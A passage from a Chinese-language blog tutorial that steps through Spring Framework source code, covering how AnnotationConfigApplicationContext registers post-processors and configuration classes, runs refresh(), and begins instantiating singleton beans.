<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotationConfigApplicationContext</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 创建一个读取注解的Bean定义读取器</span></span><br><span class="line"><span class="comment">	 * 什么是bean定义？BeanDefinition</span></span><br><span class="line"><span class="comment">	 * 完成了spring内部BeanDefinition的注册（主要是后置处理器）</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">this</span>.reader = <span class="keyword">new</span> <span class="title class_">AnnotatedBeanDefinitionReader</span>(<span class="built_in">this</span>);</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 创建BeanDefinition扫描器</span></span><br><span class="line"><span class="comment">	 * 可以用来扫描包或者类，继而转换为bd</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * spring默认的扫描包不是这个scanner对象</span></span><br><span class="line"><span class="comment">	 * 而是自己new的一个ClassPathBeanDefinitionScanner</span></span><br><span class="line"><span class="comment">	 * spring在执行工程后置处理器ConfigurationClassPostProcessor时，去扫描包时会new一个ClassPathBeanDefinitionScanner</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 这里的scanner仅仅是为了程序员可以手动调用AnnotationConfigApplicationContext对象的scan方法</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">this</span>.scanner = <span class="keyword">new</span> <span class="title class_">ClassPathBeanDefinitionScanner</span>(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>OK这里我们再次分析</p>
<h4 id="BeanDefinitionReader初始化"><a href="#BeanDefinitionReader初始化" class="headerlink" title="BeanDefinitionReader初始化"></a>BeanDefinitionReader初始化</h4><p>首先进入他的初始化中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以看到registry其实就是AnnotationConfigApplicationContext实例</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotatedBeanDefinitionReader</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">	<span class="built_in">this</span>(registry, getOrCreateEnvironment(registry));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotatedBeanDefinitionReader</span><span class="params">(BeanDefinitionRegistry registry, Environment environment)</span> &#123;</span><br><span class="line">	Assert.notNull(registry, <span class="string">&quot;BeanDefinitionRegistry must not be null&quot;</span>);</span><br><span class="line">	Assert.notNull(environment, <span class="string">&quot;Environment must not be null&quot;</span>);</span><br><span class="line">	<span class="comment">//把ApplicationContext对象赋值给AnnotatedBeanDefinitionReader</span></span><br><span class="line">       <span class="comment">//这里是MainConfig.class</span></span><br><span class="line">	<span class="built_in">this</span>.registry = registry;</span><br><span class="line">	<span class="comment">//用户处理条件注解 @Conditional os.name</span></span><br><span class="line">	<span class="built_in">this</span>.conditionEvaluator = <span class="keyword">new</span> <span class="title class_">ConditionEvaluator</span>(registry, environment, <span class="literal">null</span>);</span><br><span class="line">	<span class="comment">//注册一些内置的后置处理器</span></span><br><span class="line">	AnnotationConfigUtils.registerAnnotationConfigProcessors(<span class="built_in">this</span>.registry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到Reader的初始化过程中，注册了Spring内置的后置处理器。</p>
<p>这个步骤非常关键，为后续解析Bean奠定了基础，这些内置的后置处理器是Spring中<strong>创世纪</strong>的类，因为其它所有Bean的实例化都离不开它们。下面我们就根据到AnnotationConfigUtils类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerAnnotationConfigProcessors</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">	registerAnnotationConfigProcessors(registry, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册了一堆的后置处理器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Set&lt;BeanDefinitionHolder&gt; <span class="title function_">registerAnnotationConfigProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">		BeanDefinitionRegistry registry, <span class="meta">@Nullable</span> Object source)</span> &#123;</span><br><span class="line"></span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">Set&lt;BeanDefinitionHolder&gt; beanDefs = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** 主要有以下几个后置处理器:</span></span><br><span class="line"><span class="comment">        * 1. 后置处理器ConfigurationClassPostProcessor负责处理配置类</span></span><br><span class="line"><span class="comment">        * 2. 后置处理器AutowiredAnnotationBeanPostProcessor用于解析<span class="doctag">@Autowired</span>注解</span></span><br><span class="line"><span class="comment">        * 3. 后置处理器CommonAnnotationBeanPostProcessor它负责解析</span></span><br><span class="line"><span class="comment">        *    <span class="doctag">@Resource</span>、<span class="doctag">@WebServiceRef</span>、<span class="doctag">@EJB</span>三个注解。</span></span><br><span class="line"><span class="comment">        * 4. EventListenerMethodProcessor负责处理<span class="doctag">@EvenListener</span>注解</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 我们选择一个举例：</span></span><br><span class="line">      <span class="comment">// 判断是否已经存在ConfigurationClassPostProcessor的Bean定义了</span></span><br><span class="line"><span class="keyword">if</span> (!registry.</span><br><span class="line">          containsBeanDefinition(CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">	<span class="comment">// 创建该类的BeanDefinition</span></span><br><span class="line">	<span class="type">RootBeanDefinition</span> <span class="variable">def</span> </span><br><span class="line">              <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(ConfigurationClassPostProcessor.class);</span><br><span class="line">	def.setSource(source);</span><br><span class="line">          <span class="comment">// 执行registerPostProcessor方法注册Bean</span></span><br><span class="line">	beanDefs.add(registerPostProcessor(registry, def, </span><br><span class="line">                        CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME));</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">// 省略后续的后置处理器的注册过程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> beanDefs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册Bean的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> BeanDefinitionHolder <span class="title function_">registerPostProcessor</span><span class="params">(</span></span><br><span class="line"><span class="params">		BeanDefinitionRegistry registry, RootBeanDefinition definition, String beanName)</span> &#123;</span><br><span class="line">	<span class="comment">//方法开始</span></span><br><span class="line">       <span class="comment">// ROLE_INFRASTRUCTURE代表这是spring内部的，并非用户定义的</span></span><br><span class="line">	definition.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);</span><br><span class="line">       <span class="comment">// 调用DefaultListableBeanFactory的registerBeanDefinition方法</span></span><br><span class="line">	registry.registerBeanDefinition(beanName, definition);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(definition, beanName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BeanDefinitionScanner的初始化"><a href="#BeanDefinitionScanner的初始化" class="headerlink" title="BeanDefinitionScanner的初始化"></a>BeanDefinitionScanner的初始化</h4><p>由于常规使用方式是不会用到ApplicationContext里面的扫描器scanner的，因为这里的scanner仅仅是为了程序员可以手动调用AnnotationConfigApplicationContext对象的<code>scan</code>方法去扫描包。所以这里就不看scanner是如何被实例化的了。</p>
<hr>
<p>继续回到构造方法！</p>
<p>我们已经走完了<code>this()</code>方法了，他的任务是帮助父类构造方法构建，完成<code>BeanFactory</code>的构造。</p>
<p>之后进行BeanDefinitionReader和BeanDefinitionScanner的初始化。</p>
<p>还记得我们最开始的那个图吗？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/X4TUqmcu2EBWOs3.jpg"
                      alt="Screenshot_75.jpg"
                ></p>
<p>我们需要的三个类已经完成装载了。同时我们也知道在进行BeanDefinitionReader初始化的时候，进行了很重要的一些后置处理器的注册，便于在后面直接<code>getBean</code>生产出来。</p>
<p>那么在<code>ApplicationContext</code>的构造函数中，我们就到了下一个方法了！</p>
<h4 id="register-annotatedClasses"><a href="#register-annotatedClasses" class="headerlink" title="register(annotatedClasses)"></a>register(annotatedClasses)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotationConfigApplicationContext</span><span class="params">(Class&lt;?&gt;... annotatedClasses)</span> &#123;</span><br><span class="line">	<span class="comment">//调用构造函数</span></span><br><span class="line">	<span class="built_in">this</span>();</span><br><span class="line">	<span class="comment">//注册我们的配置类</span></span><br><span class="line">	register(annotatedClasses);</span><br><span class="line">	<span class="comment">//IOC容器刷新接口</span></span><br><span class="line">	refresh();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Class&lt;?&gt;... annotatedClasses)</span> &#123;</span><br><span class="line">	Assert.notEmpty(annotatedClasses, <span class="string">&quot;At least one annotated class must be specified&quot;</span>);</span><br><span class="line">       <span class="comment">//调用BeanDefinitionReader来帮助注册</span></span><br><span class="line">	<span class="built_in">this</span>.reader.register(annotatedClasses);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们接着看读取器内的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Class&lt;?&gt;... annotatedClasses)</span> &#123;</span><br><span class="line">       <span class="comment">//如果多个配置类那就依次进行注册配置类</span></span><br><span class="line">	<span class="keyword">for</span> (Class&lt;?&gt; annotatedClass : annotatedClasses) &#123;</span><br><span class="line">		registerBean(annotatedClass);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerBean</span><span class="params">(Class&lt;?&gt; annotatedClass)</span> &#123;</span><br><span class="line">	<span class="comment">//依旧调用</span></span><br><span class="line">       doRegisterBean(annotatedClass, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   &lt;T&gt; <span class="keyword">void</span> <span class="title function_">doRegisterBean</span><span class="params">(Class&lt;T&gt; annotatedClass, <span class="meta">@Nullable</span> Supplier&lt;T&gt; instanceSupplier, <span class="meta">@Nullable</span> String name,</span></span><br><span class="line"><span class="params">   <span class="meta">@Nullable</span> Class&lt;? extends Annotation&gt;[] qualifiers, BeanDefinitionCustomizer... definitionCustomizers)</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//存储@Configuration注解注释的类 得到对应的类定义</span></span><br><span class="line">       <span class="type">AnnotatedGenericBeanDefinition</span> <span class="variable">abd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotatedGenericBeanDefinition</span>(annotatedClass);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//判断是否需要跳过注解，spring中有一个@Condition注解，当不满足条件，这个bean就不会被解析</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">this</span>.conditionEvaluator.shouldSkip(abd.getMetadata())) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       abd.setInstanceSupplier(instanceSupplier);</span><br><span class="line">       <span class="comment">//解析bean的作用域，如果没有设置的话，默认为单例</span></span><br><span class="line">       <span class="type">ScopeMetadata</span> <span class="variable">scopeMetadata</span> <span class="operator">=</span> <span class="built_in">this</span>.scopeMetadataResolver.resolveScopeMetadata(abd);</span><br><span class="line">       abd.setScope(scopeMetadata.getScopeName());</span><br><span class="line">       <span class="comment">//获得beanName</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> (name != <span class="literal">null</span> ? name : <span class="built_in">this</span>.beanNameGenerator.generateBeanName(abd, <span class="built_in">this</span>.registry));</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//解析通用注解，填充到AnnotatedGenericBeanDefinition</span></span><br><span class="line">       <span class="comment">//解析的注解为Lazy，Primary，DependsOn，Role，Description</span></span><br><span class="line">       AnnotationConfigUtils.processCommonDefinitionAnnotations(abd);</span><br><span class="line">       <span class="comment">//限定符处理</span></span><br><span class="line">       <span class="keyword">if</span> (qualifiers != <span class="literal">null</span>) &#123;</span><br><span class="line">       <span class="keyword">for</span> (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; qualifier : qualifiers) &#123;</span><br><span class="line">           <span class="comment">//Primary注解</span></span><br><span class="line">           <span class="keyword">if</span> (Primary.class == qualifier) &#123;</span><br><span class="line">               abd.setPrimary(<span class="literal">true</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//Lazy注解</span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (Lazy.class == qualifier) &#123;</span><br><span class="line">               abd.setLazyInit(<span class="literal">true</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> &#123;</span><br><span class="line">               abd.addQualifier(<span class="keyword">new</span> <span class="title class_">AutowireCandidateQualifier</span>(qualifier));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span> (BeanDefinitionCustomizer customizer : definitionCustomizers) &#123;</span><br><span class="line">       customizer.customize(abd);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//再次封装为BeanDefinition</span></span><br><span class="line">       <span class="type">BeanDefinitionHolder</span> <span class="variable">definitionHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(abd, beanName);</span><br><span class="line">       definitionHolder = AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//注册，最终会调用DefaultListableBeanFactory中的registerBeanDefinition方法去注册，</span></span><br><span class="line">       <span class="comment">//DefaultListableBeanFactory维护着一系列信息，比如beanDefinitionNames，beanDefinitionMap</span></span><br><span class="line">       <span class="comment">//beanDefinitionNames是一个List&lt;String&gt;,用来保存beanName</span></span><br><span class="line">       <span class="comment">//beanDefinitionMap是一个Map,用来保存beanName和beanDefinition</span></span><br><span class="line">       BeanDefinitionReaderUtils.registerBeanDefinition(definitionHolder, <span class="built_in">this</span>.registry);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>到这里我们就大致了解了如何注册完配置类的了，主要依靠阅读器来帮助注册，然后一直往下走，确定注册的配置，如何加载、是否多个配置等等，最后依靠<code>registerBeanDefinition</code>完成在<code>BeanFactory</code>中的注册</p>
<p>到这，配置类就被解析为Bean定义注册完成了。</p>
<blockquote>
<p>@Condition注解怎么用？</p>
<p>@Condition注解一般会放在一个Bean上。@Condition中需要指定一个类，该类需要实现Condition接口并实现<code>matches()</code>方法，如果该方法返回false那么该Bean就不会被解析。</p>
</blockquote>
<h4 id="Refresh"><a href="#Refresh" class="headerlink" title="Refresh"></a>Refresh</h4><p>看到这里，Spring完成了实例化一个工厂、注册了一些内置的后置处理器和我们传进去的配置类。下面<code>refresh</code>方法才是真正的关键：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AnnotationConfigApplicationContext</span><span class="params">(Class&lt;?&gt;... componentClasses)</span> &#123;</span><br><span class="line">   <span class="comment">// 调用无参构造函数，会先调用父类GenericApplicationContext的构造函数</span></span><br><span class="line">   <span class="built_in">this</span>();</span><br><span class="line">   <span class="comment">// 注册配置类</span></span><br><span class="line">   register(componentClasses);</span><br><span class="line">   <span class="comment">// IOC容器刷新接口，非常重要的方法</span></span><br><span class="line">   refresh();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会调用到AbstractApplicationContext中的<code>refresh</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;</span><br><span class="line">   <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;</span><br><span class="line">      <span class="comment">// 刷新预处理</span></span><br><span class="line">      <span class="comment">// 保存了容器的启动时间、启动标志等信息</span></span><br><span class="line">      <span class="comment">// 还创建了一个早期事件监听器对象，和一个早期待发布的事件集合</span></span><br><span class="line">      <span class="comment">// 什么是【早期事件】？</span></span><br><span class="line">      <span class="comment">// 就是事件监听器还没有注册到多播器上的时候都称为早期事件</span></span><br><span class="line">	  <span class="comment">// 早期事件不需要手动发布，会自动发布，发布完早期事件就不存在了</span></span><br><span class="line">      prepareRefresh();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 最终获得DefaultListableBeanFactory</span></span><br><span class="line">      <span class="comment">// DefaultListableBeanFactory实现了ConfigurableListableBeanFactory接口</span></span><br><span class="line">      <span class="comment">// 1. 对于注解方式来说，这里几乎什么也没干，Bean定义的解析在后面的后置处理器中</span></span><br><span class="line">      <span class="comment">// 2. 对于xml方式来说，在这里解析Bean为Bean定义，是一种耦合的方式</span></span><br><span class="line">      <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 一些准备工作：</span></span><br><span class="line">      <span class="comment">// 1. 添加了两个Bean后置处理器</span></span><br><span class="line">      <span class="comment">//    (1) ApplicationContextAwareProcessor用于Bean初始化阶段执行一些Aware</span></span><br><span class="line">      <span class="comment">//    (2) ApplicationListenerDetector解析接口方式的事件监听器</span></span><br><span class="line">      <span class="comment">// 2. 还设置了忽略自动装配和允许自动装配的接口，比如：</span></span><br><span class="line">      <span class="comment">//    可以在Bean中@Autowired注入ApplicationContext，就是在这里设置的</span></span><br><span class="line">      <span class="comment">// 3. 注册了一些内部的Bean，这个无关紧要</span></span><br><span class="line">      prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 空方法，给子类实现</span></span><br><span class="line">         postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 调用BeanFactory的后置处理器ConfigurationClassPostProcessor处理配置类</span></span><br><span class="line">         <span class="comment">// 这是非常关键的一步，我们后续再详细分析</span></span><br><span class="line">         <span class="comment">// 这里就会将所有的Bean都封装为Bean定义</span></span><br><span class="line">         invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 实例化Bean的后置处理器（注意和BeanFactory的后置处理器区别）例如：</span></span><br><span class="line">         <span class="comment">// 1. AutowiredAnnotationBeanPostProcessor处理@Autowired注解修饰的bean并注入 			 // 2. RequiredAnnotationBeanPostProcessor处理被@Required注解修饰的方法 					 //	3. CommonAnnotationBeanPostProcessor处理@PreDestroy、@PostConstruct、	 </span></span><br><span class="line">         <span class="comment">//    @Resource等多个注解。</span></span><br><span class="line">         registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 初始化国际化资源，可忽略</span></span><br><span class="line">         initMessageSource();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 初始化事件多播器，后续再详细分析</span></span><br><span class="line">         initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 留个子类实现，SpringBoot从这个方法进行启动Tomcat</span></span><br><span class="line">         onRefresh();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 注册监听器，后续再详细分析</span></span><br><span class="line">         registerListeners();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 实例化剩余非懒加载的单例Bean（包括Bean的后置处理器）</span></span><br><span class="line">         <span class="comment">// 本结我们只简单看一下该方法，其它重要的我们单独分析</span></span><br><span class="line">         finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// refresh做完之后需要做的其他事情：</span></span><br><span class="line">         <span class="comment">// 1. 清除上下文资源缓存（如扫描中的ASM元数据）</span></span><br><span class="line">         <span class="comment">// 2. 初始化上下文的生命周期处理器，并刷新（找出Spring容器中实现了Lifecycle接口的bean并			  //	执行start()方法） </span></span><br><span class="line">         <span class="comment">// 3. 发布ContextRefreshedEvent事件告知对应的ApplicationListener进行响应的操作</span></span><br><span class="line">         <span class="comment">// SpringCloud是从这里启动的</span></span><br><span class="line">         finishRefresh();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">         <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Exception encountered during context initialization - &quot;</span> +</span><br><span class="line">                  <span class="string">&quot;cancelling refresh attempt: &quot;</span> + ex);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">         destroyBeans();</span><br><span class="line">         <span class="comment">// Reset &#x27;active&#x27; flag.</span></span><br><span class="line">         cancelRefresh(ex);</span><br><span class="line">         <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">         <span class="keyword">throw</span> ex;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class="line">         <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">         resetCommonCaches();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里完成了BeanFactory后置处理器的调用、Bean后置处理器的注册、有关事件和国际化的初始化配置，最后通过<code>finishBeanFactoryInitialization</code>实例化所有的单例Bean。本结我们只简单分析最后一步Bean的创建流程，其它重要的我们会单独分析。</p>
<hr>
<blockquote>
<p>题外话：源码真是折磨人，比AQS还折磨的多</p>
<p>下面是刚刚初始化的简略…简略图</p>
</blockquote>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/11/wTyru6ixVbev5nZ.jpg"
                      alt="Screenshot_77.jpg"
                ></p>
<p>现在我们接着看更下层的。</p>
<h3 id="Bean的创建"><a href="#Bean的创建" class="headerlink" title="Bean的创建"></a>Bean的创建</h3><p>ApplicationContext的初始化完毕，所有的Bean都被封装成Bean定义了，下面就由BeanFactory来实例化Bean。</p>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>这个流程从上面<code>refresh</code>中调用<code>finishBeanFactoryInitialization</code>方法开始：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finishBeanFactoryInitialization</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">	<span class="comment">// 为我们的bean工厂创建类型转化器  Convert</span></span><br><span class="line">	<span class="keyword">if</span> (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;</span><br><span class="line">			beanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) &#123;</span><br><span class="line">		beanFactory.setConversionService(</span><br><span class="line">				beanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	....</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Stop using the temporary ClassLoader for type matching.</span></span><br><span class="line">	beanFactory.setTempClassLoader(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//冻结所有的 bean 定义 ， 说明注册的 bean 定义将不被修改或任何进一步的处理</span></span><br><span class="line">       <span class="comment">//这里是为了防止后置处理器进行修改</span></span><br><span class="line">	beanFactory.freezeConfiguration();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//实例化剩余的单实例bean</span></span><br><span class="line">	beanFactory.preInstantiateSingletons();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们看<code>preInstantiateSingletons</code>来实例化Bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preInstantiateSingletons</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        logger.debug(<span class="string">&quot;Pre-instantiating singletons in &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取我们容器中所有bean定义的名称</span></span><br><span class="line">    <span class="comment">//得到了所有的Bean定义，下面进行实例化Bean</span></span><br><span class="line">    List&lt;String&gt; beanNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="built_in">this</span>.beanDefinitionNames);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//循环我们所有的bean定义名称</span></span><br><span class="line">    <span class="keyword">for</span> (String beanName : beanNames) &#123;</span><br><span class="line">        <span class="comment">//合并我们的bean定义，转换为统一的RootBeanDefinition类型(在)， 方便后续处理</span></span><br><span class="line">        <span class="type">RootBeanDefinition</span> <span class="variable">bd</span> <span class="operator">=</span> getMergedLocalBeanDefinition(beanName);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * 根据bean定义判断是不是抽象的&amp;&amp; 不是单例的 &amp;&amp;不是懒加载的</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">        <span class="keyword">if</span> (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) &#123;</span><br><span class="line">            <span class="comment">//是不是工厂bean</span></span><br><span class="line">            <span class="keyword">if</span> (isFactoryBean(beanName)) &#123;</span><br><span class="line">                <span class="comment">// 是factoryBean会先生成实际的bean  &amp;beanName 是用来获取实际bean的</span></span><br><span class="line">                <span class="comment">// FactoryBean通过getObject方法生成其他类型Bean的时候时</span></span><br><span class="line">                <span class="comment">// 如果BeanName前面加了&amp;符号，返回FactoryBean自身类型的对象</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> getBean(FACTORY_BEAN_PREFIX + beanName);</span><br><span class="line">                <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> FactoryBean) &#123;</span><br><span class="line">                    <span class="keyword">final</span> FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) bean;</span><br><span class="line">                    <span class="type">boolean</span> isEagerInit;</span><br><span class="line">                    <span class="keyword">if</span> (System.getSecurityManager() != <span class="literal">null</span> &amp;&amp; factory <span class="keyword">instanceof</span> SmartFactoryBean) &#123;</span><br><span class="line">                        isEagerInit = AccessController.doPrivileged(</span><br><span class="line">                            (PrivilegedAction&lt;Boolean&gt;)</span><br><span class="line">                            ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,</span><br><span class="line">                            getAccessControlContext());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        isEagerInit = (factory <span class="keyword">instanceof</span> SmartFactoryBean &amp;&amp;</span><br><span class="line">                                       ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//上面都是一系列的判断</span></span><br><span class="line">                    <span class="comment">//调用真正的getBean的流程</span></span><br><span class="line">                    <span class="keyword">if</span> (isEagerInit) &#123;</span><br><span class="line">                        getBean(beanName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;<span class="comment">//非工厂Bean 就是普通的bean</span></span><br><span class="line">                <span class="comment">//其实现在是么有Bean的 有的只是Bean定义</span></span><br><span class="line">                <span class="comment">//当调用getBean时会获取Bean定义创建Bean</span></span><br><span class="line">                getBean(beanName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//或有的bean的名称 ...........到这里所有的单实例的bean已经记载到单实例bean到缓存中</span></span><br><span class="line">    <span class="keyword">for</span> (String beanName : beanNames) &#123;</span><br><span class="line">        <span class="comment">//从单例缓存池中获取所有的对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">singletonInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line">        <span class="comment">//判断当前的bean是否实现了SmartInitializingSingleton接口</span></span><br><span class="line">        <span class="comment">//这里会执行实现SmartInitializingSingleton接口的afterSingletonsInstantiated方法</span></span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="FactoryBean和BeanFactory"><a href="#FactoryBean和BeanFactory" class="headerlink" title="FactoryBean和BeanFactory"></a>FactoryBean和BeanFactory</h5><blockquote>
<p>FactoryBean和BeanFactory的区别：</p>
<ul>
<li>BeanFactory是<strong>Spring的核心Bean工厂</strong>，用于生产Bean。</li>
